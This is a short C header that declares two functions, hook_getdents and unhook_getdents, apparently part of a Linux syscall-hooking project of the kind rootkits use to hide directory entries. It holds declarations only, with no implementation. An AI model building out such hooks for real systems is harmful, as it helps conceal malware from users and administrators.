#ifndef GETDENTS_HEADER
#define GETDENTS_HEADER

void hook_getdents(void);
void unhook_getdents(void);

#endif
